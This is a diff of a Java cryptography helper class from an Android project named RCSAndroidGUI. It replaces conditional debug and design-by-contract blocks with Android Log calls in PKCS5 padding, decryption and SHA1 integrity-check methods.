@@ -10,6 +10,8 @@ package com.ht.RCSAndroidGUI.crypto;
 
 import java.util.Arrays;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
@@ -39,11 +41,8 @@ public class EncryptionPKCS5 extends Encryption {
 
 	/** The Constant DIGEST_LENGTH. */
 	private static final int DIGEST_LENGTH = 20;
-	// #ifdef DEBUG
 	/** The debug. */
-	private static Debug debug = new Debug("EncryptionPKCS5");
-
-	// #endif
+	private static String TAG = "EncryptionPKCS5";
 	/**
 	 * Gets the next multiple.
 	 * 
@@ -53,18 +52,10 @@ public class EncryptionPKCS5 extends Encryption {
 	 */
 	@Override
 	public int getNextMultiple(final int len) {
-		// #ifdef DBC
 		Check.requires(len >= 0, "len < 0");
-		// #endif
-
 		final int newlen = len + (16 - len % 16);
-
-		// #ifdef DBC
 		Check.ensures(newlen > len, "newlen <= len");
-		// #endif
-		// #ifdef DBC
 		Check.ensures(newlen % 16 == 0, "Wrong newlen");
-		// #endif
 		return newlen;
 	}
 
@@ -86,18 +77,11 @@ public class EncryptionPKCS5 extends Encryption {
 	@Override
 	public byte[] decryptData(final byte[] cyphered, final int enclen,
 			final int offset) throws CryptoException {
-		// #ifdef DEBUG
-		debug.trace("decryptData PKCS5");
-		// #endif
-
+		Log.d(TAG,"decryptData PKCS5");
 		// int padlen = cyphered[cyphered.length -1];
 		// int plainlen = enclen - padlen;
-
-		// #ifdef DBC
 		Check.requires(enclen % 16 == 0, "Wrong padding");
 		// Check.requires(enclen >= plainlen, "Wrong plainlen");
-		// #endif
-
 		final byte[] paddedplain = new byte[enclen];
 		byte[] plain = null;
 		int plainlen = 0;
@@ -118,9 +102,7 @@ public class EncryptionPKCS5 extends Encryption {
 		final int padlen = paddedplain[paddedplain.length - 1];
 
 		if (padlen <= 0 || padlen > 16) {
-			// #ifdef DEBUG
-			debug.error("decryptData, wrong padlen: " + padlen);
-			// #endif
+			Log.e(TAG,"decryptData, wrong padlen: " + padlen);
 			throw new CryptoException();
 		}
 
@@ -128,11 +110,8 @@ public class EncryptionPKCS5 extends Encryption {
 		plain = new byte[plainlen];
 
 		System.arraycopy(paddedplain, 0, plain, 0, plainlen);
-
-		// #ifdef DBC
 		Check.ensures(plain != null, "null plain");
 		Check.ensures(plain.length == plainlen, "wrong plainlen");
-		// #endif
 		return plain;
 	}
 
@@ -147,18 +126,11 @@ public class EncryptionPKCS5 extends Encryption {
 
 		final byte[] sha = SHA1(plain);
 		final byte[] plainSha = Utils.concat(plain, sha);
-
-		// #ifdef DBC
 		Check.asserts(sha.length == DIGEST_LENGTH, "sha.length");
 		Check.asserts(plainSha.length == plain.length + DIGEST_LENGTH,
 				"plainSha.length");
-		// #endif
-
-		// #ifdef DEBUG
-		debug.trace("encryptDataIntegrity plain: " + plain.length);
-		debug.trace("encryptDataIntegrity plainSha: " + plainSha.length);
-		// #endif
-
+		Log.d(TAG,"encryptDataIntegrity plain: " + plain.length);
+		Log.d(TAG,"encryptDataIntegrity plainSha: " + plainSha.length);
 		return encryptData(plainSha, 0);
 	}
 
@@ -180,25 +152,17 @@ public class EncryptionPKCS5 extends Encryption {
 				plainSha.length - DIGEST_LENGTH, DIGEST_LENGTH);
 		final byte[] calculatedSha = SHA1(plainSha, 0, plainSha.length
 				- DIGEST_LENGTH);
-
-		// #ifdef DBC
 		// Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, "DIGEST_LENGTH");
 		Check.asserts(plain.length + DIGEST_LENGTH == plainSha.length,
 				"plain.length");
 		Check.asserts(sha.length == DIGEST_LENGTH, "sha.length");
 		Check.asserts(calculatedSha.length == DIGEST_LENGTH,
 				"calculatedSha.length");
-		// #endif
-
 		if (Arrays.equals(calculatedSha, sha)) {
-			// #ifdef DEBUG
-			debug.trace("decryptDataIntegrity: sha corrected");
-			// #endif
+			Log.d(TAG,"decryptDataIntegrity: sha corrected");
 			return plain;
 		} else {
-			// #ifdef DEBUG
-			debug.error("decryptDataIntegrity: sha error!");
-			// #endif
+			Log.e(TAG,"decryptDataIntegrity: sha error!");
 			throw new CryptoException();
 		}
 	}
